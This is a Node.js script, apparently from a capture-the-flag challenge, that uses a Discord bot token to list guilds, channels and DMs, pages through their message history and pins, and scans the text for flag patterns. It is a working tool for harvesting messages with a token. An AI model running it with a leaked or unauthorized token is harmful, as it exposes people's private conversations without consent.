#!/usr/bin/env node
// READ-ONLY Discord recon. Only GET requests. CTF authorized.
const https = require('https');

const TOKEN = process.env.TOKEN;
const API = 'https://discord.com/api/v10';
const FLAGRE = /(flag|FLAG|bytedance|ByteCTF|bytectf|ctf|CTF|bytectf)\{[^}]+\}/g;

function req(path) {
  return new Promise((resolve) => {
    const r = https.request(API + path, { headers: { Authorization: 'Bot ' + TOKEN, 'Content-Type': 'application/json' } }, (res) => {
      let data = '';
      res.on('data', (c) => (data += c));
      res.on('end', () => resolve({ status: res.statusCode, body: data, ra: res.headers['retry-after'] }));
    });
    r.on('error', (e) => resolve({ status: 0, body: String(e), err: true }));
    r.setTimeout(30000, () => { r.destroy(); resolve({ status: 0, body: 'timeout', err: true }); });
    r.end();
  });
}
async function get(path) {
  for (let i = 0; i < 6; i++) {
    const r = await req(path);
    if (r.status === 429) { await new Promise((x) => setTimeout(x, (parseFloat(r.ra) || 1) * 1000 + 200)); continue; }
    let j = null; try { j = JSON.parse(r.body); } catch (_) {}
    return { status: r.status, json: j, raw: r.body };
  }
  return { status: 0, json: null, raw: '' };
}
const seen = new Set();
function scan(label, obj) {
  if (obj == null) return;
  const s = typeof obj === 'string' ? obj : JSON.stringify(obj);
  let m; FLAGRE.lastIndex = 0;
  while ((m = FLAGRE.exec(s))) { if (!seen.has(m[0])) { seen.add(m[0]); console.log(`\n>>> FLAG FOUND in ${label}: ${m[0]}\n`); } }
  // also dump any braced tokens up to 80 chars
  const br = s.match(/\{[^{}]{3,80}\}/g) || [];
  for (const b of br) { if (!/^\{(status|message|code|retry_after|errors|session_id|url|gateway|shards)\}/.test(b) && !seen.has(b)) { seen.add(b); console.log(`[brace:${label}] ${b}`); } }
}

(async () => {
  console.log('=== VERIFY TOKEN ===');
  const me = await get('/users/@me');
  console.log('status', me.status, me.json && JSON.stringify({ id: me.json.id, username: me.json.username, bot: me.json.bot }));
  scan('me', me.json);
  if (me.status !== 200) { console.log('TOKEN INVALID or unreachable. raw:', me.raw.slice(0, 300)); return; }

  console.log('\n=== GUILDS ===');
  const guilds = await get('/users/@me/guilds');
  const gids = (guilds.json || []).map((g) => g.id);
  console.log('guilds:', (guilds.json || []).map((g) => g.id + ':' + g.name).join(', '));
  for (const g of (guilds.json || [])) scan('guild:' + g.name, g);

  console.log('\n=== DM/GROUP CHANNELS ===');
  const dms = await get('/users/@me/channels');
  const dmlist = dms.json || [];
  console.log('dm count:', dmlist.length, dmlist.map((d) => d.id + ':t' + d.type).join(', '));
  for (const d of dmlist) scan('dm:' + d.id, d);

  for (const gid of gids) {
    const gname = ((guilds.json || []).find((g) => g.id === gid) || {}).name || gid;
    console.log(`\n===== GUILD ${gid} (${gname}) =====`);
    const chs = await get('/guilds/' + gid + '/channels');
    for (const c of (chs.json || [])) scan('channel:' + c.name, [c.name, c.topic]);
    // type 0 text, 5 announcement, 15 forum
    const tch = (chs.json || []).filter((c) => [0, 5, 15].includes(c.type));
    for (const c of tch) {
      console.log(`  -- channel ${c.id} ${c.name} (${c.topic || ''})`);
      let before = '';
      for (let page = 0; page < 12; page++) {
        const url = '/channels/' + c.id + '/messages?limit=100' + (before ? '&before=' + before : '');
        const r = await get(url);
        const arr = r.json || [];
        if (!Array.isArray(arr) || !arr.length) break;
        for (const msg of arr) {
          scan('msg:' + c.name, [msg.content, (msg.embeds || []).map((e) => [e.title, e.description, (e.fields || []).map((f) => [f.name, f.value])]), (msg.attachments || []).map((a) => a.filename)]);
        }
        before = arr[arr.length - 1].id;
        if (arr.length < 100) break;
      }
      const pins = await get('/channels/' + c.id + '/pins');
      for (const p of (pins.json || [])) scan('pin:' + c.name, [p.content, (p.embeds || []).map((e) => [e.title, e.description])]);
    }
  }

  for (const d of dmlist) {
    console.log(`\n-- DM ${d.id}`);
    let before = '';
    for (let page = 0; page < 8; page++) {
      const url = '/channels/' + d.id + '/messages?limit=100' + (before ? '&before=' + before : '');
      const r = await get(url);
      const arr = r.json || [];
      if (!Array.isArray(arr) || !arr.length) break;
      for (const msg of arr) scan('dmmsg:' + d.id, [msg.content, (msg.embeds || []).map((e) => [e.title, e.description])]);
      before = arr[arr.length - 1].id;
      if (arr.length < 100) break;
    }
  }

  console.log('\n=== DONE. unique flags/braces found: ' + seen.size + ' ===');
  for (const f of seen) console.log('FOUND:', f);
})();
